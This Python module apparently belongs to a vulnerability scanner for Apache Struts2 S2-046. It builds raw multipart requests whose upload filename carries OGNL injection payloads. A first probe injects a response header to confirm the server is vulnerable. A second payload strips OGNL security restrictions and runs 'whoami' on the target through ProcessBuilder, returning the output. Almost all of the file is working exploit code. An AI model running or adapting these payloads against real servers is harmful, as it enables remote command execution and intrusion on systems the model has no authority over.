import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import re
import socket

cdd=''
http = ''
https = ''
q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('T5smQ',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )
q1= b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('whoami'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}\0b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
a1=''
a2=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd,q1,q,p,a1,a2
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        url3 = re.match('.*://.*?:(.*?)/', url1)
        df1 = str(url3)
        if df1!= 'None':
            a2=url3.group(1)
        url = re.match('.*://(.*?):.*?/', url1)
        df = str(url)
        if df != 'None':
            a1=url.group(1)
        else:
            url2 = re.match('.*://(.*?)/', url1)
            a1=url2.group(1)
            a2='80'
        with socket.create_connection((a1, a2), timeout=5) as conn:
            conn.send(p + q)
            aa=conn.recv(10240).decode()
            if 'T5smQ' in aa and '54289' in aa:
                headers = {'Upgrade-Insecure-Requests': '1',
                           'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                           'Accept-Language': 'en-US,en;q=0.8,es;q=0.6',
                           'Connection': 'close',
                           'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2',
                           'Content-Length': str(len(q1))}
                aa1 = requests.post(url1, data=q1, headers=headers, proxies=proxies, verify=False, cookies=s_cookie)
                cdd = '[+]漏洞存在 whoami\n'+str(aa)+'\n'+aa1.text
            else:
                cdd = '[-]漏洞不存在'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-046 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)